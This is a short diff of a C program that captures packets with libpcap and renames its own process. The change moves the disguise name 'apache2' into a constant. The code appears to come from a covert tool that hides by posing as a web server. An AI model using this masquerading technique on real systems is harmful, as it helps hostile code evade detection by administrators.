@@ -4,6 +4,7 @@
 
 #include <errno.h>
 
+#include "constants.h"
 #include "mask.h"
 #include "packet_handler.h"
 
@@ -25,9 +26,7 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
 
 int main(int argc, char *argv[])
 {
-    const char* new_process_name = "apache2";
-
-    if (mask_process(argv[0], new_process_name) != 0)
+    if (mask_process(argv[0], NEW_PROCESS_NAME) != 0)
     {
         fprintf(stderr, "mask_process failed: %s\n", strerror(errno));
         return -1;
